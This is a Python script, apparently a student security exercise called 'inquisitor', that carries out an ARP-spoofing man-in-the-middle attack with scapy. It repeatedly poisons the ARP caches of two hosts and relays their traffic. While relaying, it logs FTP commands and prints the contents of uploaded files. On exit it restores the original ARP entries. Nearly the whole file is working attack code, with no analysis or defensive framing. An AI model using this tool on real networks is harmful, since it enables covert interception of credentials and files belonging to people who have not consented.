import sys
import ipaddress
import re
import signal
import uuid
import socket
import time
from scapy.all import ls, PacketList, Packet, Raw
from scapy.sendrecv import sendp, sr1, AsyncSniffer
from scapy.interfaces import get_if_list
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP


IFACE='eth0'

OP_REQUEST=1
OP_REPLY=2
FTP_PORT=21
SNIFFER=None
FTP_MIN=21000
FTP_MAX=21010
FLAGS={
    "print_all": ["--all", "-a"],
    "print_content": ["--file-content", "-c"],
    "print_ftp": ["--all_ftp", "-f"],
}
STR_infos={
    "src_ip": None,
    "src_mac": None,
    "dst_ip": None,
    "dst_mac": None,
}
ARP_modif=False

class InquisitorException(Exception):
    pass

def get_ip(arg: str):
    try:
        ip = ipaddress.ip_address(arg)
        if isinstance(ip, ipaddress.IPv6Address):
            raise InquisitorException(f"{arg} not a valid address ipv4")
        return ip
    except Exception as e:
        raise InquisitorException(f"{arg} not a valid address ipv4")

def get_mac(arg:str):
    try:
        if re.match("^[0-9a-f]{2}([:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", arg.lower()):
            if len(arg) == 17:
                return bytes.fromhex("".join(arg.split(":")))
    except Exception as e:
        raise InquisitorException(f"{arg} not a mac address -- {e}")
    raise InquisitorException(f"{arg} not a mac address")

def padding(data: bytes, length: int):
    if len(data) < length:
        data = data + b"\x00" * (length - len(data))
    return data

def get_ether_frame(src_mac: bytes, dst_mac: bytes | None, length: int):
    if dst_mac is None:
        dst_mac = b"\xff" * 6
    preambule = b"\x00" * 7
    sfd = 0b10101011.to_bytes(1, "big")
    length = (length + 7 + 1 + 6 * 2 + 2 + 4).to_bytes(2, "big")
    return preambule + sfd + dst_mac + src_mac + length

def get_my_ip():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    return ipaddress.IPv4Address(IPAddr)

def get_mac_for_ip(ip_src: ipaddress.IPv4Address, mac_src: bytes, ip_dst: ipaddress.IPv4Address) -> str | None:
    res = sr1(ARP(op=OP_REQUEST, psrc=str(ip_src), pdst=str(ip_dst), hwsrc=mac_src), verbose=False, timeout=3)
    if isinstance(res, ARP):
        if not ( hasattr(res, "op") and hasattr(res, "psrc") and hasattr(res, "hwdst") and hasattr(res, "pdst") ):
            return None
        if res.op == OP_REPLY and res.psrc == str(ip_dst) and get_mac(res.hwdst) == mac_src and res.pdst == str(ip_src):
            return res.hwsrc
    return None

def send_arp(ip_src: ipaddress.IPv4Address, mac_src: bytes, ip_dst: ipaddress.IPv4Address, mac_dst: bytes) -> PacketList | None:
    a = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=OP_REPLY, psrc=str(ip_src), pdst=str(ip_dst), hwsrc=mac_src, hwdst=mac_dst, hwlen=6, plen=4)
    return sendp(a, IFACE, verbose=False)

def main(argv: list[str]):
    global ARP_modif
    global STR_infos
    if len(argv) < 5:
        raise InquisitorException("need 4 arguments at least")
    verbose = False
    print_file_content=False
    STR_infos['src_ip'] = ""
    STR_infos['dst_ip'] = ""
    STR_infos['src_mac'] = ""
    STR_infos['dst_mac'] = ""
    for arg in argv[1:]:
        if arg in FLAGS["print_all"]:
            verbose = True
            print_file_content = True
        elif arg in FLAGS["print_content"]:
            print_file_content = True
        elif arg in FLAGS["print_ftp"]:
            verbose = True
        elif STR_infos['src_ip'] == "":
            STR_infos['src_ip'] = arg
        elif STR_infos['src_mac'] == "":
            STR_infos['src_mac'] = arg
        elif STR_infos['dst_ip'] == "":
            STR_infos['dst_ip'] = arg
        elif STR_infos['dst_mac'] == "":
            STR_infos['dst_mac'] = arg
        else:
            raise InquisitorException(f"{arg} not a param or a flag")
    ip_src = get_ip(STR_infos['src_ip'])
    mac_src = get_mac(STR_infos['src_mac'])
    ip_target = get_ip(STR_infos['dst_ip'])
    mac_target = get_mac(STR_infos['dst_mac'])
    my_mac_addr = uuid.getnode().to_bytes(6, "big")
    my_ip_addr = get_my_ip()
    str_my_ip_addr = str(my_ip_addr)
    print("me", my_ip_addr, my_mac_addr)
    print("src", ip_src, mac_src)
    print("target", ip_target, mac_target)
    iface = get_if_list()
    if IFACE not in iface:
        raise InquisitorException(f"interface {IFACE} not found")
    if ip_src == ip_target or mac_src == mac_target:
        raise InquisitorException(f"src and target are the same (IP or MAC)")
    test_mac = get_mac_for_ip(my_ip_addr, my_mac_addr, ip_src)
    if test_mac != STR_infos['src_mac']:
        raise InquisitorException(f"Parameter error : {ip_src} not corresponding to {STR_infos['src_mac']}, it is {test_mac}")
    test_mac = get_mac_for_ip(my_ip_addr, my_mac_addr, ip_target)
    if test_mac != STR_infos['dst_mac']:
        raise InquisitorException(f"Parameter error : {ip_target} not corresponding to {STR_infos['dst_mac']}, it is {test_mac}")

    last_file = ""
    ips = {STR_infos['src_ip']: STR_infos['src_mac'], STR_infos['dst_ip']: STR_infos['dst_mac']}
    ARP_modif = True
    SNIFFER = AsyncSniffer(iface=IFACE, lfilter=lambda x: (x.haslayer(Ether) and x.haslayer(IP) and get_mac(x[Ether].dst) == my_mac_addr and x[IP].src in ips.keys() and x[IP].dst in ips.keys()))
    SNIFFER.start()
    while True:
        send_arp(ip_target, my_mac_addr, ip_src, mac_src)
        send_arp(ip_src, my_mac_addr, ip_target, mac_target)
        time.sleep(.2)
        r: list[Packet] | None = SNIFFER.stop()
        SNIFFER.start()
        if r is not None:
            # print(r, len(r))
            for p in r:
                # print(p)
                # p.show()
                if Raw in p and FTP_PORT in [p[TCP].sport, p[TCP].dport]:
                    cmd = p[Raw].load.decode()
                    if verbose:
                        print(f"{p[IP].src} -> {p[IP].dst} : {cmd}")
                    if cmd.startswith("STOR"):
                        last_file = cmd[5:-2]
                        print(f"{p[IP].src} -> {p[IP].dst} : '{last_file}' file transfert")
                    if cmd.startswith("DELE"):
                        last_file = cmd[5:-2]
                        print(f"{p[IP].src} -> {p[IP].dst} : '{last_file}' file deleted")
                if print_file_content and Raw in p and (FTP_MIN <= p[TCP].sport <= FTP_MAX or FTP_MIN <= p[TCP].dport <= FTP_MAX):
                    file_content = p[Raw].load.decode()
                    print(f"{p[IP].src} -> {p[IP].dst} : FILE_CONTENT of {last_file} : {file_content}")
                p[Ether].src = my_mac_addr
                p[Ether].dst = ips[p[IP].dst]
                sendp(p, IFACE, verbose=False)


def usage():
    print(f"""
python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <SRC-target>
{",".join(FLAGS['print_all'])}          print content of files transfered and all ftp trafic
{",".join(FLAGS['print_content'])} print content of files transfered
{",".join(FLAGS['print_ftp'])}      print all ftp trafic
""")

def restore_arp(signum, frame):
    global ARP_modif
    global STR_infos
    print("Ctrl+C caught! Exiting gracefully...")
    if ARP_modif:
        print("Restore arp tables")
        try:
            my_mac_addr = uuid.getnode().to_bytes(6, "big")
            my_ip_addr = get_my_ip()
            send_arp(my_ip_addr, my_mac_addr, ipaddress.IPv4Address(STR_infos["src_ip"]), get_mac(STR_infos['src_mac']))
            send_arp(my_ip_addr, my_mac_addr, ipaddress.IPv4Address(STR_infos['dst_ip']), get_mac(STR_infos['dst_mac']))
            send_arp(ipaddress.IPv4Address(STR_infos['dst_ip']), get_mac(STR_infos['dst_mac']), ipaddress.IPv4Address(STR_infos["src_ip"]), get_mac(STR_infos['src_mac']))
            send_arp(ipaddress.IPv4Address(STR_infos["src_ip"]), get_mac(STR_infos['src_mac']), ipaddress.IPv4Address(STR_infos['dst_ip']), get_mac(STR_infos['dst_mac']))
        except Exception as e:
            print(e)
    sys.exit(0)

if __name__ == '__main__':
    try:
        signal.signal(signal.SIGINT, restore_arp)
        try:
            main(sys.argv)
        except InquisitorException as e:
            restore_arp(None, None)
            raise e
        except Exception as e:
            print(e)
        finally:
            restore_arp(None, None)
    except InquisitorException as e:
        print(f"Error : {e}")
        usage()
